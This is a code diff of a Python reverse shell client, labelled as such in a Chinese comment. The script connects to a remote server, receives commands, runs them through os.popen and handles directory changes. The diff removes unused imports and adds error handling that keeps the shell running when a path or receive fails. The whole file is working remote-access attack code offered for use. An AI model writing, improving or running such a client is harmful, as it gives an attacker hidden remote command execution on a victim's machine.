@@ -1,7 +1,5 @@
 import socket
 import time
-import pymysql
-import threading
 import os
 
 #反弹shell客户端
@@ -13,6 +11,7 @@ def connect_server():
         s.connect(hostport)
     except:
         print("连接服务器异常")
+        
     return s
 
 if __name__ == '__main__':
@@ -20,15 +19,20 @@ if __name__ == '__main__':
     while True:
         try:
             try:
-                cmd=s.recv(2048).decode() #解码获取命令
+                cmd = s.recv(2048).decode() #解码获取命令
             except:
                 print("客户端没有返回")
+                cmd = ""
 
             print("服务器命令",cmd)
 
             if cmd.startswith("cd"):
-                os.chdir(cmd[2:].strip())   #切换路径
-                result=os.getcwd()      #显示路径
+                try:
+                    os.chdir(cmd[2:].strip())   #切换路径
+                    result=os.getcwd()      #显示路径
+                except:
+                    print("错误路径")
+                    result = "错误路径"
             else:
                 result=os.popen(cmd).read() #获取反馈
             if result:
